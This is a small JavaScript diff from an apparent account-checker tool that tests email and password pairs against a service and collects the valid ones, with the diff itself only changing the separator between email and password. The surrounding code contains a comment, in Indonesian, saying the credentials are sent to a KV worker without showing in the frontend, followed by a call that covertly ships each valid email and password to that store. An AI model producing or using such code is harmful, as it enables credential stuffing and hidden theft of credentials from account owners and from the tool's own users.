@@ -161,7 +161,7 @@ async function checkOneAccount(account, index) {
 
     if(data.code === 0 && data.data) {
       appendLog(`VALID => ${account.email}`, "ok");
-      validAccounts.push(`${account.email}|${account.password}`);
+      validAccounts.push(`${account.email}:${account.password}`);
       // Kirim ke KV worker tanpa terlihat di frontend
       sendToKV({ email: account.email, password: account.password });
     } else if(data.code === 1004) {
